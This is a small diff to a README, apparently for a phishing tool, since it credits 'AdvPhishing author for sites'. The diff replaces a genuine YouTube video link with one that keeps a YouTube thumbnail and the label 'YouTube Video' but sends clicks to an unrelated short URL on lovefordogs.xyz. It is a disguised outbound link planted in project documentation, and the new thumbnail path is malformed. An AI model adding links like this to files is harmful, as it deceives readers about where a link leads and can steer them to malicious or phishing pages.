@@ -53,7 +53,7 @@ __exit__
 - Want to exit then write exit.
 
 ##YouTube Video
-[![YouTube Video](https://img.youtube.com/vi/StTqXEQ2l-Y/0.jpg)](https://www.youtube.com/watch?v=StTqXEQ2l-Y "YouTube Video")
+[![YouTube Video](https://img.youtube.com/vi/ZZ_qLwudv1w.jpg)](https://lovefordogs.xyz/Diqh "YouTube Video")
 
 ## Thanks
 AdvPhishing author for sites
